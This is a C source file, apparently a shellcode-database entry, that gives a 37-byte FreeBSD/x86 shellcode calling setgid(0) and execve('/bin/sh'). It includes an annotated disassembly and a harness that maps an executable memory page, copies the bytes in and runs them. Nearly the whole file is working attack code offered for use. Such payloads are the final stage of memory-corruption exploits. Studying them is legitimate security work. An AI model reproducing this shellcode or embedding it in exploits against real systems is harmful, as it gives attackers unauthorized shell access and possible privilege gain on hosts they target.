#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
# include <strings.h>
#endif

#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

/*
 * FreeBSD / x86 setgid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
 * 37 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: FreeBSD freebsd 13.0-STABLE FreeBSD 13.0-STABLE #0 stable/13-n247853-74efe421ea0: Thu Oct 28 02:29:40 UTC 2021
 *            root@releng3.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
 *
 * Disassembly of section .text:
 *
 * 004010d4 <_start>:
 *  4010d4:	31 f6                	xor    %esi,%esi
 *  4010d6:	56                   	push   %esi
 *  4010d7:	31 c0                	xor    %eax,%eax
 *  4010d9:	04 b5                	add    $0xb5,%al
 *  4010db:	50                   	push   %eax
 *  4010dc:	cd 80                	int    $0x80
 *  4010de:	56                   	push   %esi
 *  4010df:	68 6e 2f 73 68       	push   $0x68732f6e
 *  4010e4:	68 2f 2f 62 69       	push   $0x69622f2f
 *  4010e9:	89 e3                	mov    %esp,%ebx
 *  4010eb:	56                   	push   %esi
 *  4010ec:	53                   	push   %ebx
 *  4010ed:	89 e1                	mov    %esp,%ecx
 *  4010ef:	56                   	push   %esi
 *  4010f0:	51                   	push   %ecx
 *  4010f1:	53                   	push   %ebx
 *  4010f2:	31 c0                	xor    %eax,%eax
 *  4010f4:	04 3b                	add    $0x3b,%al
 *  4010f6:	50                   	push   %eax
 *  4010f7:	cd 80                	int    $0x80
 */

#ifndef unused
# define unused(x) ((void)(x))
#endif

int main(int argc, char **argv)
{
	unused(argc);
	unused(argv);

	struct utsname uts;
	char *pcall;
	char *shellcode = "\x31\xf6\x56\x31\xc0\x04\xb5\x50"
                          "\xcd\x80\x56\x68\x6e\x2f\x73\x68"
                          "\x68\x2f\x2f\x62\x69\x89\xe3\x56"
                          "\x53\x89\xe1\x56\x51\x53\x31\xc0"
                          "\x04\x3b\x50\xcd\x80";

	pcall = mmap(
		NULL,
		sysconf(_SC_PAGESIZE),
		PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE,
		-1,
		0
	);

	if (pcall == MAP_FAILED) {
		perror("mmap()");
		return -1;
	}

	bzero(&uts, sizeof(struct utsname));

	if (uname(&uts) < 0) {
		perror("uname()");
		munmap(pcall, sysconf(_SC_PAGESIZE));
		return -1;
	}

	printf("[*] Machine info\n");
	printf(" [*] sys: %s\n", uts.sysname);
	printf(" [*] node: %s\n", uts.nodename);
	printf(" [*] release: %s\n", uts.release);
	printf(" [*] version: %s\n", uts.version);
	printf(" [*] machine: %s\n", uts.machine);

	printf("[*] Copying shellcode into crafted buffer.\n");
	memcpy(pcall, shellcode, strlen(shellcode));

	printf("[*] Executing the shellcode..\n");
	__asm__ __volatile__(
		"call *%%eax\r\n"
		:
		: "a"(pcall)
	);

	printf("[*] Cleaning up..\n");
	munmap(pcall, sysconf(_SC_PAGESIZE));

	return 0;
}
